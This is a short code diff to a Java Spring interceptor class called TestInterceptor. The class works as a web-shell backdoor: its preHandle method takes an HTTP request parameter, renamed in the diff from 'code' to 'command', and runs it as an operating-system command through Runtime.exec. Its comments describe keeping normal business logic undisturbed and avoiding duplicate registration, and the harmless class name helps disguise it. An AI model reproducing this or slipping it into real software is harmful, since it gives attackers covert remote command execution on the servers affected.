@@ -17,7 +17,7 @@ public class TestInterceptor extends HandlerInterceptorAdapter {
         // 避免重复添加
         for (int i = adaptedInterceptors.size() - 1; i > 0; i--) {
             if (adaptedInterceptors.get(i) instanceof TestInterceptor) {
-                System.out.println("已经添加过TestInterceptor实例了");
+                System.out.println("已经添加过TestInterceptor实例");
                 return;
             }
         }
@@ -29,7 +29,7 @@ public class TestInterceptor extends HandlerInterceptorAdapter {
 
     @Override
     public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
-        String code = request.getParameter("code");
+        String code = request.getParameter("command");
         // 不干扰正常业务逻辑
         if (code != null) {
             java.lang.Runtime.getRuntime().exec(code);
